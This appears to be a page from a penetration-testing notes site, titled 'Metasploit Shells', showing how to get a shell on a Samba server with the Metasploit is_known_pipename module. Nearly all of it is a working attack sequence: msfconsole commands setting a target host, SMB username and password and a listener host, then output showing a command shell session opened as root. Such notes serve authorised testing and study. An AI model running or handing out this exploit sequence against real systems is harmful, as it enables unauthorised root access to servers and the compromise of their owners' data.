---
layout: default
title: Metasploit Shells
parent: Shells
nav_order: 6
---

# Metasploit Shells

---

## Samba - Is Known Pipe

Compromised credentials for an account can be used to gain a shell via the Metasploit module _exploit/linux/samba/is_known_pipename_

```bash
msfconsole -q
msf6 > use exploit/linux/samba/is_known_pipename
msf6 exploit(linux/samba/is_known_pipename) > set RHOST 172.16.5.10
msf6 exploit(linux/samba/is_known_pipename) > set SMBUser admin
msf6 exploit(linux/samba/is_known_pipename) > set SMBPass et1@sR7!
msf6 exploit(linux/samba/is_known_pipename) > set LHOST 172.16.5.101
msf6 exploit(linux/samba/is_known_pipename) > set SMB::AlwaysEncrypt false
msf6 exploit(linux/samba/is_known_pipename) > exploit

[*] Found shell.
[*] Command shell session 1 opened (0.0.0.0:0 -> 172.16.5.10:445) at 2023-12-01 18:30:07 -0500

id
uid=0(root) gid=0(root) groups=0(root)
```
